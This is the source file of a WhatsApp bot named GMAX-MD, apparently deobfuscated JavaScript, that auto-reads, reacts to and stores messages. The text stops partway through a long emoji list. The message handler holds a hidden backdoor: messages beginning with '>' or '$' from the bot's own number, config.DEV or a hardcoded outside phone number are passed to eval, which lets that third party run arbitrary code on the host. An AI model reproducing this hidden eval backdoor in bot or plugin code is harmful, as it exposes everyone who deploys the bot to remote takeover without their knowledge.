function f3() {
  console.log("Hello World!");
}
f3();
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require("@whiskeysockets/baileys");
const v102 = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage
} = require("./data");
const fs = require("fs");
const fluentFfmpeg2 = require("fluent-ffmpeg");
const pino2 = require("pino");
const config = require("./config");
const qrcodeTerminal2 = require("qrcode-terminal");
const waStickerFormatter2 = require("wa-sticker-formatter");
const util = require("util");
const {
  sms,
  downloadMediaMessage,
  AntiDelete
} = require("./lib");
const fileType2 = require("file-type");
const axios = require("axios");
const {
  File
} = require("megajs");
const {
  fromBuffer
} = require("file-type");
const bodyParser2 = require("body-parser");
const os = require("os");
const crypto2 = require("crypto");
const path = require("path");
const v103 = config.PREFIX;
const v104 = ["263719647303"];
const v105 = path.join(os.tmpdir(), "cache-temp");
if (!fs.existsSync(v105)) {
  fs.mkdirSync(v105);
}
const vF3 = () => {
  fs.readdir(v105, (p85, p86) => {
    if (p85) {
      throw p85;
    }
    for (const v106 of p86) {
      fs.unlink(path.join(v105, v106), p87 => {
        if (p87) {
          throw p87;
        }
      });
    }
  });
};
setInterval(vF3, 300000);
if (!fs.existsSync(__dirname + "/sessions/creds.json")) {
  if (!config.SESSION_ID) {
    return console.log("Please add your Gmax session to SESSION_ID env !!");
  }
  const v107 = config.SESSION_ID.replace("GMAX-MD~", "");
  const v108 = File.fromURL("https://mega.nz/file/" + v107);
  v108.download((p88, p89) => {
    if (p88) {
      throw p88;
    }
    fs.writeFile(__dirname + "/sessions/creds.json", p89, () => {
      console.log("Session downloaded ✅");
    });
  });
}
const express = require("express");
const vExpress = express();
const v109 = process.env.PORT || 7860;
async function f4() {
  console.log("[❄️] GmaX Connecting to WhatsApp ⏳️...");
  const {
    state: _0x27029b,
    saveCreds: _0x28b73f
  } = await useMultiFileAuthState(__dirname + "/sessions/");
  var {
    version: _0x2f8de2
  } = await fetchLatestBaileysVersion();
  const vMakeWASocket2 = makeWASocket({
    logger: pino2({
      level: "silent"
    }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: _0x27029b,
    version: _0x2f8de2
  });
  vMakeWASocket2.ev.on("connection.update", p90 => {
    const {
      connection: _0x28f9a1,
      lastDisconnect: _0x1f880c
    } = p90;
    if (_0x28f9a1 === "close") {
      if (_0x1f880c.error.output.statusCode !== DisconnectReason.loggedOut) {
        f4();
      }
    } else if (_0x28f9a1 === "open") {
      console.log("[❄️] 🛠️ Installing Plugins.");
      const path4 = require("path");
      fs.readdirSync("./plugins/").forEach(p91 => {
        if (path4.extname(p91).toLowerCase() == ".js") {
          require("./plugins/" + p91);
        }
      });
      console.log("[❄️] Plugins installed successful ✅");
      console.log("[❄️] GmaX MD connected to whatsapp ✅");
      let v110 = "*Hi Owner😇, Congrats SubZero Connected Successfully! 🚀* \n\n> Light, Cold, Icy, Fast & Rich Loaded With Features, GmaX W.A Bot.\n\n *Thanks for using GMAX-MD ❄️* \n\n> Join WhatsApp Channel :- 🛠️\n \nhttps://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x\n\n- *ყσµɾ ɓσƭ ρɾεƒเא ➜*  " + v103 + "\n\n──────────────\nDont forget to  star our repo☺ \n\nhttps://github.com/Gmaxtech2024/GMAX-MD\n\n> © 🎐ᴘϙᴡᴇʀᴇᴅ ʙʏ ᴍʀ ɢᴍᴀx ⚡";
      vMakeWASocket2.sendMessage(vMakeWASocket2.user.id, {
        image: {
          url: "https://i.ibb.co/6BMJmGY/mrfrankofc.jpg"
        },
        caption: v110
      });
    }
  });
  vMakeWASocket2.ev.on("creds.update", _0x28b73f);
  vMakeWASocket2.ev.on("messages.update", async p92 => {
    for (const v111 of p92) {
      if (v111.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(v111, null, 2));
        await AntiDelete(vMakeWASocket2, p92);
      }
    }
  });
  vMakeWASocket2.ev.on("messages.upsert", async p93 => {
    p93 = p93.messages[0];
    if (!p93.message) {
      return;
    }
    p93.message = getContentType(p93.message) === "ephemeralMessage" ? p93.message.ephemeralMessage.message : p93.message;
    if (config.READ_MESSAGE === "true") {
      await vMakeWASocket2.readMessages([p93.key]);
      console.log("Marked message from " + p93.key.remoteJid + " as read.");
    }
    if (p93.message.viewOnceMessageV2) {
      p93.message = getContentType(p93.message) === "ephemeralMessage" ? p93.message.ephemeralMessage.message : p93.message;
    }
    if (p93.key && p93.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_SEEN === "true") {
      await vMakeWASocket2.readMessages([p93.key]);
    }
    if (p93.key && p93.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_SEEN === "true") {
      const v112 = await vMakeWASocket2.decodeJid(vMakeWASocket2.user.id);
      const v113 = ["❄️", "💸", "😇", "🍂", "💥", "💯", "🔥", "💫", "💎", "💗", "🤍", "🖤", "👀", "🙌", "🙆", "🚩", "🥰", "💐", "😎", "🤎", "✅", "🫀", "🧡", "😁", "😄", "🌸", "🕊️", "🌷", "⛅", "🌟", "🗿", "🇿🇼", "💜", "💙", "🌝", "🖤", "💚"];
      const v114 = v113[Math.floor(Math.random() * v113.length)];
      await vMakeWASocket2.sendMessage(p93.key.remoteJid, {
        react: {
          text: v114,
          key: p93.key
        }
      }, {
        statusJidList: [p93.key.participant, v112]
      });
    }
    if (p93.key && p93.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_REPLY === "true") {
      const v115 = p93.key.participant;
      const v116 = "" + config.AUTO_STATUS_MSG;
      await vMakeWASocket2.sendMessage(v115, {
        text: v116,
        react: {
          text: "💜",
          key: p93.key
        }
      }, {
        quoted: p93
      });
    }
    await Promise.all([saveMessage(p93)]);
    const vSms2 = sms(vMakeWASocket2, p93);
    const vGetContentType2 = getContentType(p93.message);
    const v117 = JSON.stringify(p93.message);
    const v118 = p93.key.remoteJid;
    const v119 = vGetContentType2 == "extendedTextMessage" && p93.message.extendedTextMessage.contextInfo != null ? p93.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const v120 = vGetContentType2 === "conversation" ? p93.message.conversation : vGetContentType2 === "extendedTextMessage" ? p93.message.extendedTextMessage.text : vGetContentType2 == "imageMessage" && p93.message.imageMessage.caption ? p93.message.imageMessage.caption : vGetContentType2 == "videoMessage" && p93.message.videoMessage.caption ? p93.message.videoMessage.caption : "";
    const v121 = v120.startsWith(v103);
    var v122 = typeof p93.text == "string" ? p93.text : false;
    const v123 = v121 ? v120.slice(v103.length).trim().split(" ").shift().toLowerCase() : "";
    const v124 = v120.trim().split(/ +/).slice(1);
    const v125 = v124.join(" ");
    const v126 = v124.join(" ");
    const v127 = v118.endsWith("@g.us");
    const v128 = p93.key.fromMe ? vMakeWASocket2.user.id.split(":")[0] + "@s.whatsapp.net" || vMakeWASocket2.user.id : p93.key.participant || p93.key.remoteJid;
    const v129 = v128.split("@")[0];
    const v130 = vMakeWASocket2.user.id.split(":")[0];
    const v131 = p93.pushName || "Sin Nombre";
    const v132 = v130.includes(v129);
    const v133 = v104.includes(v129) || v132;
    const v134 = await jidNormalizedUser(vMakeWASocket2.user.id);
    const v135 = v127 ? await vMakeWASocket2.groupMetadata(v118).catch(p94 => {}) : "";
    const v136 = v127 ? v135.subject : "";
    const v137 = v127 ? await v135.participants : "";
    const v138 = v127 ? await getGroupAdmins(v137) : "";
    const v139 = v127 ? v138.includes(v134) : false;
    const v140 = v127 ? v138.includes(v128) : false;
    const v141 = vSms2.message.reactionMessage ? true : false;
    const vF4 = p95 => {
      vMakeWASocket2.sendMessage(v118, {
        text: p95
      }, {
        quoted: p93
      });
    };
    const v142 = v130.split("@")[0];
    "255753853473";
    "255753853473";
    const v143 = "255622053093";
    let v144 = [v142, v143, config.DEV].map(p96 => p96.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(p93.sender);
    if (v144 && p93.text.startsWith(">")) {
      let v145 = v122.slice(2);
      if (!v145) {
        vF4("Provide me with a query to run Master!");
        return;
      }
      try {
        let vEval2 = eval(v145);
        if (typeof vEval2 === "object") {
          vF4(util.format(vEval2));
        } else {
          vF4(util.format(vEval2));
        }
      } catch (_0x21af67) {
        vF4(util.format(_0x21af67));
      }
      return;
    }
    if (v144 && p93.text.startsWith("$")) {
      let v146 = v122.slice(2);
      if (!v146) {
        vF4("Provide me with a query to run Master!");
        return;
      }
      try {
        let v147 = await eval("const a = async()=>{\n" + v146 + "\n}\na()");
        let v148 = util.format(v147);
        if (v148 === undefined) {
          return console.log(v148);
        } else {
          vF4(v148);
        }
      } catch (_0x460928) {
        if (_0x460928 === undefined) {
          return console.log("error");
        } else {
          vF4(util.format(_0x460928));
        }
      }
      return;
    }
    if (v129.includes("255753853473")) {
      if (v141) {
        return;
      }
      vSms2.react("👨‍💻");
    }
    if (!v141 && v129 !== v130) {
      if (config.AUTO_REACT === "true") {
        const v149 = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝", "😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌", "😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔", "🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩", "🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂", "📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔", "❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭", "👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴", "🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥", "🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾", "🏀", "🏈", "🎯", "🏆", "??", "⬆️", "⬇️", "⇒", "⇐", "↩️", "↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵", "🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️", "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿", "🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊", "🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎", "🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖", "🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘", "🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️", "🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨", "🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦", "🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚", "🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖", "🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚", "😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒", "🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷", "🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫", "🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁", "☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰", "😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫", "🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩", "🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋", "💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣", "💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋", "🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀", "🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦", "👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️", "🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️", "🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦", "🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂", "💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️", "👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰", "🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️", "🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️", "🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞", "🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️", "💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃", "🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️", "🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️", "🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️", "⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵", "🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️", "🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️", "🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", "💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
        const v150 = v149[Math.floor(Math.random() * v149.length)];
        vSms2.react(v150);
      }
    }
    if (!v141 && v129 === v130) {
      if (config.AUTO_REACT === "true") {
        const v151 = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", 